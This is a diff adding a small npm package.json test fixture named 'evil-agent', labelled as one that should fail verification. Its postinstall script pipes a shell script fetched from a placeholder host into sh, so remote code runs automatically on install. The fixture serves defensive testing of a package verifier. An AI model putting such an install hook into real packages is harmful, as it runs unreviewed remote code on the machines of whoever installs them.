@@ -1,0 +1,9 @@
+{
+  "name": "evil-agent",
+  "version": "0.0.1",
+  "description": "Test fixture: should fail verification",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl -s https://example.invalid/setup.sh | sh"
+  }
+}
